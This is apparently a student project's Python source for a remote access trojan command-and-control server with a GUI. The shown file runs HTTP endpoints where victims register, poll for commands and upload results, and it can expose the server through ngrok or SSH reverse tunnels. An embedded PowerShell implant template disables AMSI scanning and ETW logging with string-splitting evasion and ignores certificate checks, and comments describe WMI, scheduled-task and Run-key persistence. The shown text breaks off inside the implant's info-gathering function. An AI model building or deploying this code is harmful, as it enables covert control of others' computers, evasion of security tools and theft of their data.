"""
================================================================================
  Project  : RAT C2 Server
  Full Name: RAT C2 Server By George Papasotiriou AKA AmericanDream7
  Date     : March 2026
  Author   : George Papasotiriou (AmericanDream7)
  Version  : v2.1 — Lab Edition
  Purpose  : Cybersecurity Part2 Final project / controlled lab environment
================================================================================
"""
# Standard library imports — no installation required
import socket, struct, json, os, sys, base64, threading, time, queue, re, shutil, ssl
import subprocess, urllib.request, urllib.parse, random, uuid
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer  # built-in HTTP server (no Flask needed)
import tkinter as tk                                                  # GUI framework (built into Python)
from tkinter import ttk, filedialog, messagebox, scrolledtext        # themed widgets + dialogs
from datetime import datetime                                          # timestamps for logs and labels
from io import BytesIO                                                 # in-memory byte buffer (screenshot decoding)
from pathlib import Path                                               # cross-platform file path handling

# ---------------------------------------------------------------------------
# Auto-install all required packages on startup
# Uses sys.executable so it always targets the same Python that is running
# (equivalent to: py -m pip install <pkg>)
# ---------------------------------------------------------------------------
_ALL_REQUIRED = [
    "Pillow",        # PIL — screenshot display in Surveillance tab
    "pyfiglet",      # figlet banner in standalone obfuscator CLI
    "easygui",       # file-picker dialog in standalone obfuscator CLI
    "tqdm",          # progress bar in standalone obfuscator CLI
    "colorama",      # colour output in standalone obfuscator CLI
    "pylnk3",        # Windows LNK shortcut support
    "cryptography",  # TLS self-signed cert generation
]
# Some packages use a different import name than their pip install name
_PKG_IMPORT_MAP = {
    "Pillow": "PIL",    # pip: Pillow  →  import PIL
    "pylnk3": "pylnk3",
}
# Try importing each package; if missing, install it silently via pip
for _pkg in _ALL_REQUIRED:
    _import_name = _PKG_IMPORT_MAP.get(_pkg, _pkg.lower().replace("-", "_"))
    try:
        __import__(_import_name)
    except ImportError:
        print(f"Installing {_pkg}...")
        try:
            subprocess.check_call(
                [sys.executable, "-m", "pip", "install", _pkg],
                stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
            )
        except Exception as _e:
            print(f"  Warning: could not install {_pkg}: {_e}")

# PIL (Pillow) — used to display screenshots in the Surveillance tab
# HAS_PIL is checked at runtime before any image rendering attempt
try:
    from PIL import Image, ImageTk
    HAS_PIL = True
except ImportError:
    HAS_PIL = False

# Standalone CLI obfuscator dependencies — only needed for the terminal-based
# obfuscator launched via "Open Standalone Obfuscator" button.
# HAS_OBF_CLI gates the launch button so it shows a clear error if missing.
try:
    import pyfiglet           # ASCII art banner in the CLI obfuscator
    import easygui            # native OS file-picker dialog
    from tqdm import tqdm     # progress bar during obfuscation pipeline
    import colorama
    from colorama import Fore, Style
    colorama.init(autoreset=True)   # resets colour codes after each print on Windows
    HAS_OBF_CLI = True
except ImportError:
    HAS_OBF_CLI = False

# pylnk3 — reserved for future LNK (Windows shortcut) payload generation
try:
    import pylnk3   # noqa: F401  — available for future LNK payload generation
    HAS_LNK = True
except ImportError:
    HAS_LNK = False

# ---------------------------------------------------------------------------
# Global defaults — these can be overridden from the GUI header bar
# ---------------------------------------------------------------------------
DEFAULT_HOST  = "127.0.0.1"   # default listen address (loopback = localhost only)
DEFAULT_PORT  = 4444           # default C2 listen port
DOWNLOADS_DIR = Path("downloads")  # local folder for received files (unused by current flow)

# ---------------------------------------------------------------------------
# Colour palette — Tokyo Night-inspired dark theme used throughout the GUI.
# All widget colours reference this dict so changing a value here updates
# the entire UI consistently.
# ---------------------------------------------------------------------------
C = {
    "bg":        "#12131a",   # deepest background (root window, PanedWindow)
    "bg2":       "#1a1b26",   # main panel background (tab content areas)
    "bg3":       "#1e2030",   # slightly lighter panel (toolbars, section headers)
    "panel":     "#1e1f2e",   # client list sidebar background
    "border":    "#2a2b3d",   # separator / sash colour
    "accent":    "#7aa2f7",   # primary accent — blue (headings, active tab, links)
    "accent2":   "#bb9af7",   # secondary accent — purple (obfuscator, AI tab)
    "success":   "#9ece6a",   # green — successful status, Start button, AI replies
    "error":     "#f7768e",   # red — error status, Stop/Kill/Delete actions
    "warning":   "#e0af68",   # amber — warnings, destructive confirmations
    "text":      "#c0caf5",   # primary text colour
    "text2":     "#565f89",   # dimmed/secondary text (labels, hints)
    "text3":     "#a9b1d6",   # mid-brightness text (process names, file entries)
    "entry":     "#16161e",   # Entry widget background (input fields)
    "term_bg":   "#0d0e17",   # terminal widget background (Shell, PostEx output)
    "term_fg":   "#9ece6a",   # terminal foreground — green (like a classic terminal)
    "sel":       "#283457",   # selection highlight colour in text widgets
    "btn":       "#24283b",   # button background
    "btn_hover": "#2e3354",   # button background on hover / active
}

# ---------------------------------------------------------------------------
# Font definitions — used across all widgets for consistent typography.
# Consolas is the monospace font for terminal output; Segoe UI for UI labels.
# ---------------------------------------------------------------------------
FONT_MONO    = ("Consolas", 10)          # terminal output (Shell tab)
FONT_MONO_SM = ("Consolas", 9)           # smaller terminal output (PostEx, AI chat)
FONT_UI      = ("Segoe UI", 10)          # normal UI text
FONT_UI_SM   = ("Segoe UI", 9)           # small UI labels and button text
FONT_UI_B    = ("Segoe UI", 10, "bold")  # bold UI labels (tab headers)
FONT_TITLE   = ("Segoe UI", 12, "bold")  # large title in the header bar


# ---------------------------------------------------------------------------
# Network helpers
# ---------------------------------------------------------------------------

def recv_exact(sock, n):
    """Read exactly n bytes from a socket, blocking until all arrive.

    Standard socket.recv() may return fewer bytes than requested (TCP fragmentation).
    This helper loops until the full n bytes are assembled.
    Returns None if the connection is closed before n bytes arrive.
    """
    buf = b""
    while len(buf) < n:
        chunk = sock.recv(n - len(buf))
        if not chunk:
            return None    # connection closed mid-stream
        buf += chunk
    return buf


# XOR key used to obfuscate all JSON messages on the wire.
# The same key is embedded in _PS_TEMPLATE so the PowerShell client
# can XOR-encrypt its responses before posting them to /u.
_XOR_KEY = b"RATKey2026"

# Holds the current PowerShell script bytes; served raw at GET /p so the
# BAT payload can optionally fetch it over HTTP instead of embedding it.
_current_ps_script: bytes = b""


def _xor(data: bytes) -> bytes:
    """XOR every byte with the repeating _XOR_KEY.

    This is a simple stream cipher used to prevent trivial cleartext sniffing
    of C2 traffic.  Not cryptographically strong — combined with HTTPS/TLS
    it provides an additional layer of obfuscation.
    XOR is its own inverse: _xor(_xor(data)) == data.
    """
    key = _XOR_KEY
    kl  = len(key)
    return bytes(b ^ key[i % kl] for i, b in enumerate(data))


def send_msg(sock, data):
    """Serialize data to JSON, XOR-encrypt it, then send over a raw TCP socket.

    Wire format: [4-byte big-endian length][XOR-encrypted JSON bytes]
    Note: send_msg / recv_msg are kept for legacy TCP socket compatibility
    but the current HTTP-polling architecture uses HPost/HGet in PowerShell
    and urllib.request on the server side — not raw sockets.
    """
    payload = json.dumps(data, ensure_ascii=False).encode("utf-8")
    enc     = _xor(payload)
    sock.sendall(struct.pack(">I", len(enc)) + enc)


def recv_msg(sock):
    """Read a length-prefixed XOR-encrypted JSON message from a raw TCP socket.

    Reads the 4-byte big-endian length header first, then reads that many
    bytes and XOR-decrypts them back to JSON.
    Returns None if the socket closes prematurely.
    """
    raw_len = recv_exact(sock, 4)
    if raw_len is None:
        return None
    length   = struct.unpack(">I", raw_len)[0]
    raw_data = recv_exact(sock, length)
    if raw_data is None:
        return None
    return json.loads(_xor(raw_data).decode("utf-8"))


def _build_ssl_context():
    """Generate a temporary self-signed cert and return an ssl.SSLContext.
    Returns None if the cryptography package is unavailable."""
    import tempfile
    from datetime import timedelta
    try:
        from cryptography import x509
        from cryptography.x509.oid import NameOID
        from cryptography.hazmat.primitives import hashes, serialization
        from cryptography.hazmat.primitives.asymmetric import rsa

        key  = rsa.generate_private_key(public_exponent=65537, key_size=2048)
        name = x509.Name([x509.NameAttribute(NameOID.COMMON_NAME, "c2")])
        now  = datetime.utcnow()
        cert = (
            x509.CertificateBuilder()
            .subject_name(name)
            .issuer_name(name)
            .public_key(key.public_key())
            .serial_number(x509.random_serial_number())
            .not_valid_before(now)
            .not_valid_after(now + timedelta(days=3650))
            .sign(key, hashes.SHA256())
        )
        tmp    = tempfile.gettempdir()
        cert_f = os.path.join(tmp, "c2s.pem")
        key_f  = os.path.join(tmp, "c2k.pem")
        with open(cert_f, "wb") as fh:
            fh.write(cert.public_bytes(serialization.Encoding.PEM))
        with open(key_f, "wb") as fh:
            fh.write(key.private_bytes(
                serialization.Encoding.PEM,
                serialization.PrivateFormat.TraditionalOpenSSL,
                serialization.NoEncryption(),
            ))
        ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
        ctx.load_cert_chain(cert_f, key_f)
        return ctx
    except Exception:
        return None


# ---------------------------------------------------------------------------
# ClientSession
# ---------------------------------------------------------------------------

class ClientSession:
    """Represents one connected victim / implant.

    The HTTP-polling architecture works like this:
      1. Victim POSTs to /r with system info  →  server creates a ClientSession
         and returns a UUID session_id (SID).
      2. Victim GETs /c?s=<SID> every ~800 ms  →  server returns next pending
         command (or {"type":"wait"} if idle).
      3. Operator calls send_command(cmd) from a GUI thread:
           - stores cmd in _pending_cmd
           - blocks on _result_evt (a threading.Event) up to CMD_TIMEOUT seconds
      4. When victim next polls /c it picks up the command; executes it.
      5. Victim POSTs result to /u?s=<SID>  →  server calls deliver_result()
         which sets _result_evt, waking the blocked GUI thread.

    Threading:
      - _pending_cmd and _result are protected by self.lock.
      - _result_evt is set only once per command cycle and cleared at the
        start of send_command() before the new command is placed.
    """

    _id_counter = 0          # monotonically increasing display ID (not the UUID SID)
    CMD_TIMEOUT = 60          # seconds to wait for a command result before giving up

    def __init__(self, session_id, addr, info):
        ClientSession._id_counter += 1
        self.id           = ClientSession._id_counter   # short display ID (#1, #2, ...)
        self.session_id   = session_id                  # UUID assigned at /r registration
        self.ip           = addr if isinstance(addr, str) else addr[0]
        self.addr         = (self.ip, 0)
        self.port         = 0
        self.info         = info          # dict of system info sent by victim at /r
        self.lock         = threading.Lock()
        self.connected_at = datetime.now()
        self.connected    = True          # set to False when victim disconnects / times out
        self._pending_cmd = None          # command waiting to be picked up by next /c poll
        self._result      = None          # result delivered by /u upload
        self._result_evt  = threading.Event()  # signals send_command() that result arrived
        self._last_poll   = time.time()   # tracks last /c or /u activity (heartbeat)

    @property
    def label(self):
        """Human-readable client label: HOSTNAME [IP] ★ADMIN (if elevated)."""
        host       = self.info.get("hostname", self.ip)
        public_ip  = self.info.get("public_ip", "")
        local_ip   = self.info.get("local_ip", "")
        # Prefer public IP for display; fall back to local IP then raw connection IP
        if public_ip and public_ip not in ("?", ""):
            ip_display = public_ip
        elif local_ip and local_ip not in ("?", ""):
            ip_display = local_ip
        else:
            ip_display = self.ip
        admin_tag = "  \u2605ADMIN" if self.info.get("is_admin") else ""
        return f"{host}  [{ip_display}]{admin_tag}"

    @property
    def os_label(self):
        """Short OS description shown next to hostname in the client list."""
        os_release = self.info.get("os_release", "")
        os_ver     = self.info.get("os_version", "")
        arch       = self.info.get("architecture", "")
        if os_release and os_release not in ("?", ""):
            base = os_release
        else:
            base = f"{self.info.get('os', 'Windows')} {os_ver}"
        return f"{base}  {arch}".strip()

    def send_command(self, cmd):
        """Place cmd in the pending queue and block until the victim uploads a result.

        Called from GUI worker threads (never from the main thread).
        Raises ConnectionError if:
          - session is already closed
          - no result arrives within CMD_TIMEOUT seconds
          - session closes while waiting for result
        Returns the result dict delivered by deliver_result().
        """
        with self.lock:
            if not self.connected:
                raise ConnectionError("Session closed")
            self._result     = None
            self._result_evt.clear()   # reset the event for this new command cycle
            self._pending_cmd = cmd
        # Lock released here — PS can poll /c and upload result without contention
        ok = self._result_evt.wait(timeout=self.CMD_TIMEOUT)
        if not ok:
            with self.lock:
                self.connected    = False
                self._pending_cmd = None
            raise ConnectionError(
                f"No response within {self.CMD_TIMEOUT}s — client may be offline")
        with self.lock:
            if not self.connected:
                raise ConnectionError("Session closed during command")
            return self._result

    def get_pending_cmd(self):
        """Called by the HTTP handler when victim GETs /c.  Returns the pending command
        (consuming it from the queue) or None if there is nothing to do.
        Also updates _last_poll so the heartbeat loop knows the victim is alive.
        """
        self._last_poll = time.time()
        cmd = self._pending_cmd
        self._pending_cmd = None   # consume the command — won't be re-sent on next poll
        return cmd

    def deliver_result(self, result):
        """Called by the HTTP handler when victim POSTs result to /u.
        Stores the result and signals the blocked send_command() call to wake up.
        """
        self._last_poll = time.time()
        self._result = result
        self._result_evt.set()    # unblocks send_command() which is waiting on this event

    def ping(self, timeout=10):
        """Returns True if the victim has polled /c or uploaded a result within the
        last 90 seconds.  Used by the heartbeat loop to detect silent disconnects.
        """
        if not self.connected:
            return False
        return (time.time() - self._last_poll) < 90

    def close(self):
        """Mark session as disconnected and wake any blocked send_command() call
        so it can raise a ConnectionError instead of hanging until timeout.
        """
        self.connected = False
        self._result_evt.set()   # unblock send_command if it's waiting


# ---------------------------------------------------------------------------
# RATServer
# ---------------------------------------------------------------------------

class RATServer:
    """HTTP C2 server that hosts the victim polling endpoints.

    Built on Python's built-in ThreadingHTTPServer — no external web framework
    needed.  Each HTTP request is handled in its own thread from the thread pool.

    Endpoints:
      POST /r   — victim registers (sends system info, receives a session UUID)
      GET  /c   — victim polls for the next command  (returns JSON command or {"type":"wait"})
      POST /u   — victim uploads a command result
      POST /dbg — victim posts debug/log messages (visible in server log)
      GET  /h   — heartbeat / health-check  (returns {"ok":1})
      GET  /p   — serve the raw PowerShell script bytes (for alternative delivery)
    """

    def __init__(self, host, port, on_connect, on_disconnect, auth_token="", on_log=None):
        self.host          = host
        self.port          = port
        self.on_connect    = on_connect      # callback: ServerApp._on_client_connect
        self.on_disconnect = on_disconnect   # callback: ServerApp._on_client_disconnect (unused in HTTP mode)
        self.auth_token    = auth_token      # optional shared secret; blank = open access
        self.on_log        = on_log          # callback: ServerApp._server_log for status bar messages
        self._httpd        = None            # ThreadingHTTPServer instance
        self._sessions     = {}              # SID (str UUID) → ClientSession
        self._sess_lock    = threading.Lock()  # guards _sessions dict for concurrent access

    def start(self):
        """Instantiate and start the HTTP server in a background daemon thread."""
        rat = self   # closure reference used inside _H handler class

        class _H(BaseHTTPRequestHandler):
            """Inner HTTP request handler — one instance per request, per thread."""

            def log_message(self, *a):
                pass   # suppress the default per-request console output from BaseHTTPRequestHandler

            def _body(self):
                """Read the raw request body bytes (respects Content-Length header)."""
                n = int(self.headers.get("Content-Length", 0))
                return self.rfile.read(n)

            def _json(self, obj, code=200):
                """Serialize obj to JSON and send it as the HTTP response."""
                b = json.dumps(obj).encode()
                self.send_response(code)
                self.send_header("Content-Type", "application/json")
                self.send_header("Content-Length", str(len(b)))
                self.send_header("Access-Control-Allow-Origin", "*")
                self.end_headers()
                self.wfile.write(b)

            def do_POST(self):
                """Handle POST /r  (register), POST /u  (upload result), POST /dbg  (debug log)."""
                try:
                    p    = urllib.parse.urlparse(self.path)
                    path = p.path
                    qs   = urllib.parse.parse_qs(p.query)

                    if path == "/r":
                        # ── Victim registration ──────────────────────────────────────────
                        # Victim sends its system profile JSON; server creates a ClientSession
                        # and returns a unique session_id (SID) the victim uses for all future
                        # polls and uploads.
                        try:
                            body = json.loads(self._body())
                        except Exception:
                            self._json({"error": "bad json"}, 400); return
                        tok = body.get("token", "")
                        # If an auth token is configured, reject victims that don't match
                        if rat.auth_token and tok != rat.auth_token:
                            if rat.on_log:
                                rat.on_log(
                                    f"[HTTP] TOKEN MISMATCH from {self.client_address[0]} — "
                                    f"payload token='{tok}' expected='{rat.auth_token}'. "
                                    f"Regenerate payload or clear the C2 Auth Token field!"
                                )
                            self._json({"error": "forbidden"}, 403); return
                        sid  = str(uuid.uuid4())   # unique session identifier
                        ip   = self.client_address[0]
                        # Extract all system info fields sent in the registration body
                        info = {
                            "hostname":         body.get("hostname", "?"),
                            "username":         body.get("username", ""),
                            "domain":           body.get("domain", ""),
                            "architecture":     body.get("architecture", ""),
                            "os":               body.get("os", "Windows"),
                            "os_release":       body.get("os_release", "?"),
                            "os_version":       body.get("os_version", "?"),
                            "os_build":         body.get("os_build", "?"),
                            "cpu_model":        body.get("cpu_model", "?"),
                            "ram_gb":           body.get("ram_gb", "?"),
                            "local_ip":         body.get("local_ip", "?"),
                            "public_ip":        body.get("public_ip", "?"),
                            "is_admin":         body.get("is_admin", False),
                            "uptime":           body.get("uptime", "?"),
                        }
                        session = ClientSession(sid, ip, info)
                        with rat._sess_lock:
                            rat._sessions[sid] = session
                        if rat.on_log:
                            rat.on_log(
                                f"[HTTP] Registered {info['hostname']} @ {ip} — session ready"
                            )
                        rat.on_connect(session)    # notifies GUI to add victim to client list
                        self._json({"session_id": sid})

                    elif path == "/u":
                        # ── Command result upload ─────────────────────────────────────────
                        # Victim executed a command and is uploading the result JSON.
                        # deliver_result() wakes the blocked send_command() call in the GUI.
                        sid = qs.get("s", [""])[0]
                        with rat._sess_lock:
                            sess = rat._sessions.get(sid)
                        if not sess:
                            self._json({"error": "not found"}, 404); return
                        try:
                            result = json.loads(self._body())
                        except Exception:
                            result = {}
                        if rat.on_log:
                            status = result.get("status", "?") if isinstance(result, dict) else "?"
                            rat.on_log(
                                f"[HTTP] /u  result received status={status} "
                                f"← {sess.info.get('hostname','?')}"
                            )
                        sess.deliver_result(result)
                        self._json({"ok": 1})

                    elif path == "/dbg":
                        # ── Victim debug / log messages ───────────────────────────────────
                        # The PowerShell FDBG() function POSTs timestamped debug lines here.
                        # These appear in the server log (status bar + shell output) and are
                        # useful for troubleshooting payload issues without touching the victim.
                        try:
                            body_bytes = self._body()
                            try:
                                dbg_obj = json.loads(body_bytes)
                                msg = dbg_obj.get("msg", body_bytes.decode("utf-8", "replace"))
                            except Exception:
                                msg = body_bytes.decode("utf-8", "replace")
                            if rat.on_log:
                                rat.on_log(f"[PS-DBG] {msg}")
                        except Exception:
                            pass
                        self._json({"ok": 1})

                    else:
                        self._json({"error": "not found"}, 404)

                except Exception as _e:
                    try:
                        if rat.on_log:
                            rat.on_log(f"[HTTP] POST handler error: {_e}")
                    except Exception:
                        pass

            def do_GET(self):
                """Handle GET /c  (command poll), GET /h  (health), GET /p  (PS script)."""
                try:
                    p    = urllib.parse.urlparse(self.path)
                    path = p.path
                    qs   = urllib.parse.parse_qs(p.query)

                    if path == "/c":
                        # ── Command poll ──────────────────────────────────────────────────
                        # Victim calls this every ~800 ms.  Server returns the next pending
                        # command dict, {"type":"wait"} if idle, or {"type":"disconnect"} if
                        # the operator has closed the session.
                        sid = qs.get("s", [""])[0]
                        with rat._sess_lock:
                            sess = rat._sessions.get(sid)
                        if not sess:
                            if rat.on_log:
                                rat.on_log(
                                    f"[HTTP] /c  SID={sid[:8]}... NOT FOUND in sessions "
                                    f"(known: {[s[:8] for s in list(rat._sessions.keys())[:3]]})"
                                )
                            self._json({"type": "wait"}); return
                        if not sess.connected:
                            if rat.on_log:
                                rat.on_log(f"[HTTP] /c  {sess.info.get('hostname','?')} → disconnect")
                            self._json({"type": "disconnect"}); return
                        cmd = sess.get_pending_cmd()   # consumes from queue (returns None if empty)
                        if cmd is not None and rat.on_log:
                            rat.on_log(
                                f"[HTTP] /c  dispatching {cmd.get('type','?')} "
                                f"→ {sess.info.get('hostname','?')}"
                            )
                        self._json(cmd if cmd is not None else {"type": "wait"})

                    elif path == "/h":
                        # ── Health check ──────────────────────────────────────────────────
                        # Simple liveness probe; returns {"ok":1}
                        self._json({"ok": 1})

                    elif path == "/p":
                        # ── PowerShell script download ────────────────────────────────────
                        # Serves the current _current_ps_script as plain text.
                        # The BAT payload can use this to fetch and run the PS script
                        # over HTTP instead of embedding it in base64 echo lines.
                        ps = _current_ps_script
                        self.send_response(200)
                        self.send_header("Content-Type", "text/plain; charset=utf-8")
                        self.send_header("Content-Length", str(len(ps)))
                        self.end_headers()
                        self.wfile.write(ps)

                    else:
                        self._json({"error": "not found"}, 404)

                except Exception as _e:
                    try:
                        if rat.on_log:
                            rat.on_log(f"[HTTP] GET handler error: {_e}")
                    except Exception:
                        pass

        # Start the HTTP server; each request gets its own thread from ThreadingHTTPServer
        self._httpd = ThreadingHTTPServer((self.host, self.port), _H)
        threading.Thread(target=self._httpd.serve_forever, daemon=True).start()

    def stop(self):
        """Shut down the HTTP server gracefully."""
        if self._httpd:
            try:
                self._httpd.shutdown()
            except Exception:
                pass
            self._httpd = None


# ---------------------------------------------------------------------------
# TunnelManager  — wraps ngrok TCP and serveo.net SSH reverse tunnels
# ---------------------------------------------------------------------------

class TunnelManager:
    """Manages optional reverse tunnel processes (ngrok or SSH) that expose
    the local C2 HTTP port to the public internet.

    Only one tunnel can be active at a time.  The tunnel process runs as a
    subprocess; its public address is discovered asynchronously and reported
    back via a callback so the GUI can update without blocking the main thread.

    Supported modes:
      ngrok — launches ngrok binary; polls ngrok's local REST API (port 4040)
              every 500 ms until the public URL appears (up to 12 s).
      SSH   — launches OpenSSH with -R flag to serveo.net (or similar);
              reads stdout line by line looking for "tcp://host:port".
    """

    def __init__(self):
        self._proc       = None    # active tunnel subprocess (Popen)
        self._mode       = None    # "ngrok" | "ssh" | None
        self.public_addr = None    # public tunnel address reported by the active tunnel

    @property
    def running(self):
        """True if a tunnel subprocess is alive (poll() returns None = still running)."""
        return self._proc is not None and self._proc.poll() is None

    def _popen(self, cmd):
        """Launch cmd as a hidden subprocess, capturing stdout+stderr together.
        CREATE_NO_WINDOW prevents a console flash on Windows."""
        flags = subprocess.CREATE_NO_WINDOW if sys.platform == "win32" else 0
        return subprocess.Popen(cmd, stdout=subprocess.PIPE,
                                stderr=subprocess.STDOUT,
                                creationflags=flags)

    def start_ngrok(self, ngrok_exe, port, callback):
        """Start ngrok HTTP tunnel on the given local port.

        Stops any existing tunnel first, then launches ngrok and starts a
        background thread that polls ngrok's local REST API to find the
        public URL.  callback(addr, err) is called when the address is found
        or if the attempt times out.
        """
        self.stop()   # terminate any previously running tunnel
        self._mode = "ngrok"
        try:
            flags = subprocess.CREATE_NO_WINDOW if sys.platform == "win32" else 0
            # Launch ngrok; stdout/stderr discarded (we read the API instead)
            self._proc = subprocess.Popen(
                [ngrok_exe, "http", str(port)],
                stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
                creationflags=flags,
            )
            # Poll the ngrok local API in a daemon thread — GUI stays responsive
            threading.Thread(target=self._poll_ngrok, args=(callback,),
                             daemon=True).start()
        except Exception as e:
            callback(None, str(e))

    def _poll_ngrok(self, callback):
        """Background thread: poll ngrok REST API (localhost:4040) for the public URL.
        Tries up to 24 times (every 500 ms = 12 s total) before giving up.
        """
        for _ in range(24):
            time.sleep(0.5)
            try:
                # ngrok exposes a local REST API that lists active tunnels
                resp = urllib.request.urlopen(
                    "http://127.0.0.1:4040/api/tunnels", timeout=2)
                data    = json.loads(resp.read())
                tunnels = data.get("tunnels", [])
                if tunnels:
                    url  = tunnels[0]["public_url"]   # e.g. "https://abc123.ngrok.io"
                    addr = url
                    self.public_addr = addr
                    callback(addr, None)   # success — notify GUI
                    return
            except Exception:
                pass   # ngrok not ready yet — try again after 500 ms
        # Exhausted all retries
        callback(None, "ngrok API not responding after 12 s. "
                       "Check ngrok is installed and running.")

    def start_ssh(self, service, port, callback):
        """Start an SSH reverse tunnel to service (e.g. serveo.net) on the given port.

        Uses the -R 0:localhost:<port> flag so the remote assigns a free port.
        Reads the subprocess stdout to detect the assigned public address.
        callback(addr, err) is called when the address is detected or SSH exits.
        """
        self.stop()   # terminate any previously running tunnel
        self._mode = "ssh"
        # Prefer the system ssh; fall back to OpenSSH bundled with Windows 10+
        ssh = shutil.which("ssh") or r"C:\Windows\System32\OpenSSH\ssh.exe"
        cmd = [ssh,
               "-o", "StrictHostKeyChecking=no",   # skip host key prompt
               "-o", "ServerAliveInterval=30",      # keepalive ping every 30 s
               "-o", "ExitOnForwardFailure=yes",    # fail fast if port binding fails
               "-R", f"0:localhost:{port}", service]  # dynamic remote port → local port
        try:
            self._proc = self._popen(cmd)   # stdout captured so _read_ssh can parse it
            threading.Thread(target=self._read_ssh,
                             args=(callback,), daemon=True).start()
        except Exception as e:
            callback(None, str(e))

    def _read_ssh(self, callback):
        """Background thread: read SSH stdout line by line looking for 'tcp://host:port'.
        serveo.net prints this when the tunnel is established.
        """
        notified = False
        for line in self._proc.stdout:
            line = line.decode("utf-8", errors="ignore").strip()
            # Match the public TCP address announced by the SSH tunnel service
            m = re.search(r"tcp://([a-zA-Z0-9._-]+:\d+)", line)
            if m and not notified:
                addr = m.group(1)   # e.g. "serveo.net:12345"
                self.public_addr = addr
                callback(addr, None)   # success — notify GUI
                notified = True
        # stdout EOF means SSH exited (tunnel closed or failed)
        if not notified:
            callback(None, "SSH tunnel closed or address not detected.")

    def stop(self):
        """Terminate the tunnel subprocess (SIGTERM then SIGKILL) and reset state."""
        if self._proc:
            try:
                self._proc.terminate()   # polite shutdown first
            except Exception:
                pass
            try:
                self._proc.kill()        # force kill if still alive
            except Exception:
                pass
            self._proc = None
        self.public_addr = None   # clear stale address
        self._mode       = None


# ---------------------------------------------------------------------------
# PowerShell payload  (30+ command types)
# __HOST__ / __PORT__ are replaced at generation time.
# Runs silently; no Python needed on victim.
#
# AV-evasion layers:
#   1. AmsiScanBuffer memory-patch (disables AMSI scanning for this process)
#   2. ETW etwProvider.m_enabled=0 (suppresses PS script-block logging)
#   3. Random temp file names (svc<RAND>.tmp / svc<RAND>.ps1)
#   4. Self-hiding BAT (relaunches itself hidden via PowerShell Start-Process)
#   5. WMI event-subscription persistence (hardest to detect / remove)
#   6. Scheduled-task + Run-key persistence also available via C2 System tab
# ---------------------------------------------------------------------------

_PS_TEMPLATE = r"""
$_URL='__URL__'
$_nmc='using System;using System.Runtime.InteropServices;using System.Text;public class NM{[Dll'+'Import("user32.dll")]public static extern IntPtr GetForegroundWindow();[Dll'+'Import("user32.dll")]public static extern int GetWindowText(IntPtr h,StringBuilder s,int c);[Dll'+'Import("user32.dll")]public static extern uint GetWindowThreadProcessId(IntPtr h,out uint p);[Dll'+'Import("user32.dll",CharSet=CharSet.Auto)]public static extern bool SystemParametersInfo(uint a,uint b,string c,uint d);}'
try{Add-Type -TypeDefinition $_nmc -Language CSharp}catch{}
$script:KS=$null;$script:KR=$null;$script:KP=$null
$XK=[Text.Encoding]::UTF8.GetBytes('RATKey2026')
function XB($b){$k=$XK;$kl=$k.Length;$o=[byte[]]::new($b.Length);for($i=0;$i-lt $b.Length;$i++){$o[$i]=$b[$i] -bxor $k[$i%$kl]};$o}
function SM($T,$O){$J=XB([Text.Encoding]::UTF8.GetBytes(($O|ConvertTo-Json -Compress -Depth 10)));$L=[BitConverter]::GetBytes([uint32]$J.Length);[Array]::Reverse($L);$T.Write($L,0,4);$T.Write($J,0,$J.Length);$T.Flush()}
function RecvMsg($T){$B=New-Object byte[]4;$I=0;while($I-lt 4){$r=$T.Read($B,$I,4-$I);if($r-le 0){throw 'connection closed'};$I+=$r};[Array]::Reverse($B);$N=[BitConverter]::ToUInt32($B,0);$D=New-Object byte[]([int]$N);$I=0;while($I-lt[int]$N){$r=$T.Read($D,$I,([int]$N)-$I);if($r-le 0){throw 'connection closed'};$I+=$r};ConvertFrom-Json([Text.Encoding]::UTF8.GetString((XB $D),0,[int]$N))}
try{[System.Net.ServicePointManager]::ServerCertificateValidationCallback={$true}}catch{}
try{[System.Net.ServicePointManager]::SecurityProtocol=[System.Net.SecurityProtocolType]::Tls12}catch{}
try{$_a=[Ref].Assembly.GetType('System.Management.Automation.'+'AmsiUtils');$_f=$_a.GetField('am'+'siI'+'nitFailed','NonPublic,Static');$_f.SetValue($null,$true)}catch{}
try{$_pe=[Ref].Assembly.GetType('System.Management.Automation.Tracing.'+'PSEtwLog'+'Provider');$_fp=$_pe.GetField('etwPr'+'ovider','NonPublic,Static');$_val=$_fp.GetValue($null);$_m=$_val.GetType().GetField('m_en'+'abled','NonPublic,Instance');$_m.SetValue($_val,0)}catch{}
function HPost($u,$o){
  $jb=[System.Text.Encoding]::UTF8.GetBytes(($o|ConvertTo-Json -Compress -Depth 10))
  for($ri=0;$ri-lt 4;$ri++){
    try{
      $wr=[System.Net.HttpWebRequest]::Create($u);$wr.Method='POST';$wr.ContentType='application/json';$wr.ContentLength=$jb.Length;$wr.Timeout=20000
      $st=$wr.GetRequestStream();$st.Write($jb,0,$jb.Length);$st.Close()
      $rs=$wr.GetResponse();$sr=New-Object System.IO.StreamReader($rs.GetResponseStream());$raw=$sr.ReadToEnd();$sr.Close();$rs.Close()
      return ($raw|ConvertFrom-Json)
    }catch{Start-Sleep -Milliseconds 500}
  }
  $null
}
function HGet($u){
  for($ri=0;$ri-lt 3;$ri++){
    try{
      $wr=[System.Net.HttpWebRequest]::Create($u);$wr.Method='GET';$wr.Timeout=8000
      $rs=$wr.GetResponse();$sr=New-Object System.IO.StreamReader($rs.GetResponseStream());$raw=$sr.ReadToEnd();$sr.Close();$rs.Close()
      return ($raw|ConvertFrom-Json)
    }catch{Start-Sleep -Milliseconds 500}
  }
  $null
}
function REGINFO(){
  try{
    $hn=$env:COMPUTERNAME;$un=$env:USERNAME;$dom=$env:USERDOMAIN;$arch=$env:PROCESSOR_ARCHITECTURE
    $o=gwmi ('Win32_Oper'+'atingSystem') -EA 0
    $osv=$(if($o){$o.Version}else{'?'})
    $osr=$(if($o){$o.Caption}else{'?'})
    $osb=$(if($o){$o.BuildNumber}else{'?'})
    $bt=$(if($o){try{$dt=[Management.ManagementDateTimeConverter]::ToDateTime($o.LastBootUpTime);$up=(Get-Date)-$dt;"$($up.Days)d $($up.Hours)h $($up.Minutes)m | Boot: $dt"}catch{'?'}}else{'?'})
    $cpu=$(try{(gwmi ('Win32_Pro'+'cessor') -EA 0|select -First 1).Name}catch{'?'})
    $ram=$(try{[math]::Round((gwmi ('Win32_Comput'+'erSystem') -EA 0).TotalPhysicalMemory/1GB,1)}catch{'?'})
